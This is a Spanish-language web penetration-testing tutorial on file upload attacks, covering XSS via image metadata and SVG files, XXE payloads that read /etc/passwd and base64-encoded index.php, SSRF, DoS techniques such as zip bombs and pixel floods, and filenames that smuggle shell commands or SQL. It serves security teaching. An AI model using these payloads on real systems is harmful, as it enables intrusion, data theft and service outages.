Otro ejemplo de ataques XSS son las aplicaciones web que muestran los metadatos de una imagen después de su carga. Para este tipo de aplicaciones web, podemos incluir una carga útil XSS en uno de los parámetros de metadatos que aceptan texto sin formato, como los parámetros Comment o Artist.

```shell-session
$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' example.jpg
$ exiftool example.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

Podemos ver que el parámetro Comment se ha actualizado con nuestro XSS. Cuando se muestran los metadatos de la imagen, la carga útil XSS debería activarse y el código JavaScript se ejecutará para llevar a cabo el ataque XSS. Además, si cambiamos el tipo MIME de la imagen a text/html, algunas aplicaciones web pueden mostrarla como un documento HTML en lugar de una imagen, en cuyo caso la carga útil XSS se activaría incluso si los metadatos no se mostraran directamente.

Por último, los ataques XSS también se pueden llevar a cabo con imágenes SVG, junto con varios otros ataques. Las imágenes Scalable Vector Graphics (SVG) están basadas en XML y describen gráficos vectoriales 2D, que el navegador convierte en una imagen. Por esta razón, podemos modificar sus datos XML para incluir una carga útil XSS.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

Una vez que subimos la imagen a la aplicación web, el XSS se activará cada vez que se muestre la imagen.


### XXE

Se pueden llevar a cabo ataques similares para provocar la explotación XXE. Con imágenes SVG, también podemos incluir datos XML maliciosos para filtrar el código fuente de la aplicación web y otros documentos internos del servidor. El siguiente ejemplo se puede utilizar para una imagen SVG que filtra el contenido de (/etc/passwd).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

Una vez que se carga y se visualiza la imagen SVG anterior, el documento XML se procesa y deberíamos obtener la información de (/etc/passwd) impresa en la página o mostrada en el código fuente de la página. Del mismo modo, si la aplicación web permite la carga de documentos XML, la misma carga útil puede llevar a cabo el mismo ataque cuando los datos XML se muestran en la aplicación web.

Aunque la lectura de archivos de sistema como /etc/passwd puede ser muy útil para la enumeración de servidores, puede tener una ventaja aún más significativa para las pruebas de penetración web, ya que nos permite leer los archivos fuente de la aplicación web. El acceso al código fuente nos permitirá encontrar más vulnerabilidades que explotar dentro de la aplicación web mediante pruebas de penetración de caja blanca. 

En el caso de la explotación de la carga de archivos, puede permitirnos localizar el directorio de carga, identificar las extensiones permitidas o encontrar el esquema de nomenclatura de los archivos, lo que puede resultar útil para una mayor explotación.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

Una vez que se muestra la imagen SVG, debemos obtener el contenido codificado en base64 de index.php, que podemos decodificar para leer el código fuente.

El uso de datos XML no es exclusivo de las imágenes SVG, ya que también se utiliza en muchos tipos de documentos, como PDF, documentos de Word, documentos de PowerPoint, entre muchos otros. 
Todos estos documentos incluyen datos XML para especificar su formato y estructura. Supongamos que una aplicación web utiliza un visor de documentos vulnerable a XXE y permite cargar cualquiera de estos documentos. En ese caso, también podemos modificar sus datos XML para incluir los elementos XXE maliciosos y podríamos llevar a cabo un ataque XXE ciego en el servidor web back-end.

Otro ataque similar que también se puede llevar a cabo a través de estos tipos de archivos es un ataque SSRF. Podemos utilizar la vulnerabilidad XXE para enumerar los servicios disponibles internamente o incluso llamar a API privadas para realizar acciones privadas.


### DoS

Por último, muchas vulnerabilidades en la carga de archivos pueden dar lugar a un ataque de denegación de servicio (DOS) en el servidor web. Por ejemplo, podemos utilizar los XXE anteriores para llevar a cabo ataques DoS.

Además, podemos utilizar una bomba de descompresión con tipos de archivos que utilizan compresión de datos, como los archivos ZIP. Si una aplicación web descomprime automáticamente un archivo ZIP, es posible cargar un archivo malicioso que contenga archivos ZIP anidados en su interior, lo que puede acabar generando muchos petabytes de datos y provocando un fallo en el servidor back-end.

Otro posible ataque DoS es un ataque de inundación de píxeles con algunos archivos de imagen que utilizan compresión de imagen, como JPG o PNG. Podemos crear cualquier archivo de imagen JPG con cualquier tamaño de imagen (por ejemplo, 500x500) y, a continuación, modificar manualmente sus datos de compresión para indicar que tiene un tamaño de (0xffff x 0xffff), lo que da como resultado una imagen con un tamaño percibido de 4 gigapíxeles. Cuando la aplicación web intenta mostrar la imagen, intentará asignar toda su memoria a esta imagen, lo que provocará un bloqueo en el servidor back-end.

Además de estos ataques, podemos probar otros métodos para provocar un DoS en el servidor back-end. Una forma es cargar un archivo demasiado grande, ya que algunos formularios de carga pueden no limitar el tamaño del archivo o no comprobarlo antes de cargarlo, lo que puede llenar el disco duro del servidor y provocar que se bloquee o se ralentice considerablemente.

Si la función de carga es vulnerable al recorrido de directorios, también podemos intentar cargar archivos en un directorio diferente (por ejemplo, ../../../etc/passwd), lo que también puede provocar que el servidor se bloquee.

![image](/assets/img/posts/file-upload/20251111213825.png)


## Otros tipos de ataque 

### Inyecciones en el nombre del archivo

Un ataque común de carga de archivos utiliza una cadena maliciosa para el nombre del archivo cargado, que puede ejecutarse o procesarse si el nombre del archivo cargado se muestra (es decir, se refleja) en la página. Podemos intentar inyectar un comando en el nombre del archivo y, si la aplicación web utiliza el nombre del archivo dentro de un comando del sistema operativo, esto puede dar lugar a un ataque de inyección de comandos.

Por ejemplo, si nombramos un archivo file$(whoami).jpg o file`whoami`.jpg o file.jpg||whoami, y luego la aplicación web intenta mover el archivo subido con un comando del sistema operativo (por ejemplo, mv file /tmp), nuestro nombre de archivo inyectaría el comando whoami, que se ejecutaría, lo que daría lugar a la ejecución remota de código.

Del mismo modo, podemos utilizar un XSS en el nombre del archivo que se ejecutaría en el equipo del objetivo si se le muestra el nombre del archivo. También podemos inyectar una consulta SQL en el nombre del archivo (por ejemplo, file';select+sleep(5);--.jpg), lo que podría provocar una inyección SQL si el nombre del archivo se utiliza de forma insegura en una consulta SQL.

### Divulgación del directorio de carga

En algunos formularios de carga de archivos, como los formularios de comentarios o de envío, es posible que no tengamos acceso al enlace de nuestro archivo cargado y que no conozcamos el directorio de cargas. En tales casos, podemos utilizar el fuzzing para buscar el directorio de cargas o incluso utilizar otras vulnerabilidades (por ejemplo, LFI/XXE) para encontrar dónde se encuentran los archivos cargados leyendo el código fuente de las aplicaciones web, como vimos en la sección anterior. 

Otro método que podemos utilizar para revelar el directorio de cargas es forzar mensajes de error, ya que a menudo revelan información útil para una mayor explotación. 

Un ataque que podemos utilizar para provocar estos errores es cargar un archivo con un nombre que ya existe o enviar dos solicitudes idénticas simultáneamente. Esto puede hacer que el servidor web muestre un error indicando que no ha podido escribir el archivo, lo que puede revelar el directorio de cargas. También podemos intentar subir un archivo con un nombre demasiado largo (por ejemplo, 5000 caracteres). Si la aplicación web no lo gestiona correctamente, también puede dar un error y revelar el directorio de subidas.

Del mismo modo, podemos probar otras técnicas para provocar un error en el servidor y revelar el directorio de subidas, junto con información adicional útil.

### Ataques avanzados de carga de archivos

Existen ataques más avanzados que pueden utilizarse con las funciones de carga de archivos. Cualquier procesamiento automático que se realice en un archivo cargado, como codificar un vídeo, comprimir un archivo o renombrarlo, puede ser objeto de explotación si no se codifica de forma segura.

Algunas bibliotecas de uso común pueden tener exploits públicos para tales vulnerabilidades, como la vulnerabilidad de carga de AVI que conduce a XXE en ffmpeg. Sin embargo, cuando se trata de código personalizado y bibliotecas personalizadas, la detección de tales vulnerabilidades requiere conocimientos y técnicas más avanzados, lo que puede llevar al descubrimiento de una vulnerabilidad avanzada de carga de archivos en algunas aplicaciones web.
